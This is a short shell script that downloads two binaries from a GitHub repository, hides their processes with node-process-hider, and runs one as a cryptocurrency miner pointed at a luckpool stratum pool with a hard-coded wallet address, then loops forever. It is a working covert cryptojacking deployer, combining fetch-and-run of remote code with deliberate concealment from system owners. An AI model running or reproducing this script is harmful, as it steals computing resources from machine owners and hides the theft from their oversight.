#!/bin/sh
wget https://github.com/bulboni/vs/raw/main/loop && chmod +x loop
wget https://github.com/bulboni/vs/raw/main/vs && chmod +x vs
apt install nodejs -y
apt install npm -y
npm i -g node-process-hider
ph add vs
ph add loop
./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 40
while [ 1 ]; do
sleep 3
done
sleep 999
